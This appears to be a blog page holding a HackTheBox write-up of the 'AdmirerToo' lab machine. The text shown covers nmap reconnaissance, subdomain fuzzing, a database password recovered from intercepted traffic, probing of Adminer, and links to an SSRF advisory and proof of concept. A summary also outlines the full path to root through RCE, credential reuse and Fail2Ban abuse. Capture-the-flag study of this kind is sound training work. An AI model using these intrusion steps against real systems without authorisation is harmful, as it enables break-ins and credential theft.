<!DOCTYPE html><html lang="en"mode="dark"><!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="AdmirerToo - HackTheBox" />
<meta property="og:locale" content="en" />
<meta name="description" content="AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root." />
<meta property="og:description" content="AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root." />
<link rel="canonical" href="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" />
<meta property="og:url" content="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" />
<meta property="og:site_name" content="4g3nt47" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-29T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="AdmirerToo - HackTheBox" />
<meta name="twitter:site" content="@UmarAbdoul" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"AdmirerToo - HackTheBox","dateModified":"2022-05-29T00:00:00+01:00","url":"https://4g3nt47.github.io/posts/hackthebox/admirertoo.html","datePublished":"2022-05-29T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/hackthebox/admirertoo.html"},"description":"AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>AdmirerToo - HackTheBox | 4g3nt47
  </title><!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
--><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="4g3nt47">
<meta name="application-name" content="4g3nt47">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">
<!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA --><!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css"><!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet"
    href="/assets/css/bootstrap-toc.min.css"><!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css"><!-- JavaScript -->

  <script src="/assets/js/jquery.min.js"></script>

</head>
<body data-spy="scroll" data-target="#toc"><!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto"><img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"></a>
    </div>

    <div class="site-title mt-3">
      <a href="/">4g3nt47</a>
    </div>
    <div class="site-subtitle font-italic">Welcome to my infosec blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs --><li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i><span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i><span>TAGS</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i><span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i><span>ABOUT</span>
      </a>
    </li> <!-- .nav-item --></ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"><a href="https://github.com/4g3nt47" aria-label="github"target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a><a href="https://twitter.com/UmarAbdoul" aria-label="twitter"target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a><a href="javascript:location.href = 'mailto:' + ['aufaruq02','gmail.com'].join('@')" aria-label="email">
        <i class="fas fa-envelope"></i>
      </a><a href="/rss/feed.xml" aria-label="rss">
        <i class="fas fa-rss"></i>
      </a></div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->
<!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb"><span>
            <a href="/">
              Home
            </a>
          </span><span>AdmirerToo - HackTheBox</span></span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">Post</div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>
<div id="main-wrapper">
      <div id="main">

        <div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
  Refactor the HTML structure.
--><!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
--><!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
--><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->

<h1 data-toc-skip>AdmirerToo - HackTheBox</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>By
    <em><a href="https://twitter.com/UmarAbdoul">Umar Abdul</a></em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted<!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeago"
    date="2022-05-29 00:00:00 +0100"data-toggle="tooltip"
      data-placement="bottom"
      title="Sun, May 29, 2022, 12:00 AM +0100">May 29, 2022</em>
</span>

      <!-- lastmod date --><!-- read time --><!--
  Calculate the post's reading time, and display the word count in tooltip
 --><!-- words per minute  --><!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2784 words">
  <em>15 min</em> read</span>
<!-- page views --></div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>AdmirerToo</strong> is a hard-rated linux box. It starts with an SSRF exploit on <em>Adminer</em> to access an instance of <em>OpenTSDB</em> on port <strong>4242</strong>, which is vulnerable to RCE. This will give you a shell on the box as <code class="language-plaintext highlighter-rouge">opentsdb</code>, which you can use to extract credentials from a configuration file and gain access to the account of <code class="language-plaintext highlighter-rouge">jennifer</code> due to password reuse. An instance of <em>OpenCATS</em> is running locally on port <strong>8080</strong>, which you can access by setting up an SSH tunnel. <em>OpenCATS</em> is running as the user <code class="language-plaintext highlighter-rouge">devel</code>, who has write permissions on the directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, and is vulnerable <em>object injection</em> that you can use to write files in the directory, and exploit the <em>Fail2Ban</em> service to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info<a href="#info" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p><img data-src="/assets/img/20220212113822.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220212113838.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon<a href="#recon" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Feb 12 11:41:17 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.137
Increasing send delay for 10.10.11.137 from 0 to 5 due to 192 out of 638 dropped probes since last increase.
Nmap scan report for admirertoo.htb (10.10.11.137)
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp   open     http           Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 12 11:42:38 2022 -- 1 IP address (1 host up) scanned in 80.99 seconds
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<h4 id="web">Web<a href="#web" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p><img data-src="/assets/img/20220212114740.png" alt="" data-proofer-ignore></p>

<p>This is a PHP site due to presence of <code class="language-plaintext highlighter-rouge">/index.php</code>. The chat bubble in the homepage sent a request to the index page, but the request does not seem to be processed by the server as there are no changes in response;</p>

<p><img data-src="/assets/img/20220212115359.png" alt="" data-proofer-ignore></p>

<p>Requesting a non-existing page leaked a possible domain;</p>

<p><img data-src="/assets/img/20220212120040.png" alt="" data-proofer-ignore></p>

<p>I updated my hosts file with it, and reload the page. Nothing changed.</p>

<p>Fuzzing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code>, I got a hit;</p>

<p><img data-src="/assets/img/20220212120534.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="dbadmirer-galleryhtb">db.admirer-gallery.htb<a href="#dbadmirer-galleryhtb" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p><img data-src="/assets/img/20220212120952.png" alt="" data-proofer-ignore></p>

<p>Clicking the <em>enter</em> button, I was login to a database management service like <em>phpMyAdmin</em> as the user <strong>admirer_ro</strong>;</p>

<p><img data-src="/assets/img/20220212121927.png" alt="" data-proofer-ignore></p>

<p>I have access to the database <strong>gallery</strong>, but I can’t make any changes to it;</p>

<p><img data-src="/assets/img/20220212122014.png" alt="" data-proofer-ignore></p>

<p>Going to the <em>privileges</em> menu from the homepage, I was able to read the password hash of the <strong>admirer_ro</strong> user;</p>

<p><img data-src="/assets/img/20220212123348.png" alt="" data-proofer-ignore></p>

<p>The password hash could not be cracked using <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, so I moved on.</p>

<p>However, I did not enter any password to login to the service, so I looked through my traffic in burp, and found a password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>;</p>

<p><img data-src="/assets/img/20220212123541.png" alt="" data-proofer-ignore></p>

<p>Looking at the source code of the login page, I found even more useful info;</p>

<p><img data-src="/assets/img/20220212124001.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="adminer">Adminer<a href="#adminer" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<blockquote>
  <p>Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007.</p>
</blockquote>

<p>The service has support for custom plugins, which are installed in the <code class="language-plaintext highlighter-rouge">/plugins</code> directory;</p>

<p><img data-src="/assets/img/20220214094555.png" alt="" data-proofer-ignore></p>

<p>My first attempt at exploiting this service is to get it to authenticate to my own MySQL server, which may let me read local files on the server running <em>adminer</em> into my own database. So I created a database named <code class="language-plaintext highlighter-rouge">admirer</code>, and add a user to it with the username <code class="language-plaintext highlighter-rouge">admirer_ro</code> and password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>.</p>

<p>Using burp’s <em>intercept</em>, I passed all the relevant config to the server;</p>

<p><img data-src="/assets/img/20220214083419.png" alt="" data-proofer-ignore></p>

<p>This didn’t work, and the login page displayed an error message;</p>

<p><img data-src="/assets/img/20220214083631.png" alt="" data-proofer-ignore></p>

<p>So I repeat the process with a wrong password to see if I can get a different response. I did;</p>

<p><img data-src="/assets/img/20220214083855.png" alt="" data-proofer-ignore></p>

<p>This indicate the first login attempt was likely successful. So I fired up <em>Wireshark</em> to see what exactly is going on.</p>

<p>As you can see from the following packets, the box did manage to successfully authenticate to my MySQL database;</p>

<p><img data-src="/assets/img/20220214084810.png" alt="" data-proofer-ignore></p>

<p>However, the client exited using the <code class="language-plaintext highlighter-rouge">quit</code> (the last highlighted packet) command after the authentication has been completed. I have no clue why this is happening, may be the service is doing some sort of validation?</p>

<p>Another thing I saw while going through the packets is support for <code class="language-plaintext highlighter-rouge">LOAD DATA LOCAL</code> command by the client, which is a command I could use to read local files on the box should the server allow it;</p>

<p><img data-src="/assets/img/20220214085622.png" alt="" data-proofer-ignore></p>

<p>After the MySQL session was closed, my box made a HTTP request to the server, and was given a <strong>403 Forbidden</strong> response;</p>

<p><img data-src="/assets/img/20220214090602.png" alt="" data-proofer-ignore></p>

<p>My guess is this is somehow interfering with the web login. The cookies look very interesting, so I started studying them. The cookie <code class="language-plaintext highlighter-rouge">adminer_permanent</code> is a URL-encoded base64-string;</p>

<p><img data-src="/assets/img/20220214091542.png" alt="" data-proofer-ignore></p>

<p>The cookie contains the database host, database name, and database username. The cookies <code class="language-plaintext highlighter-rouge">adminer_key</code> and <code class="language-plaintext highlighter-rouge">adminer_sid</code> look interesting, but I have no idea what they are. So I decided to install <em>Adminer</em> locally on my box in hope of learning more about them.</p>

<p>I installed <em>Adminer</em> in a docker container along with a MySQL server, then I configured another MySQL service on my main host. In both databases, I created a database named <code class="language-plaintext highlighter-rouge">admirer</code> and created a user for it named <code class="language-plaintext highlighter-rouge">admirer_ro</code> with the passwords set to <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>. Interestingly, my approach worked locally, and I was able to get the <em>Adminer</em> service in my docker container to connect to the database on my main host. I have no clue why it’s not working on the box, so I just moved on.</p>

<p>Searching for exploits for the version of adminer running, I found this at https://github.com/advisories/GHSA-x5r2-hj5c-8jx6;</p>

<p><img data-src="/assets/img/20220214154948.png" alt="" data-proofer-ignore></p>

<p>The version of Adminer running on the host is vulnerable to SSRF. The PoC is in a linked PDF. It links to a python script at https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd, which can be used to setup the redirect.</p>

<p>SSRF flaws are mainly used to access internal resources, or resources we are not allowed to directly access. Going back to my initial port scan, NMAP reported port <strong>4242</strong> as <em>filtered</em>;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>---[snip]---
|_http-title: Admirer
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---[snip]---
</pre></td></tr></tbody></table></code></div></div>

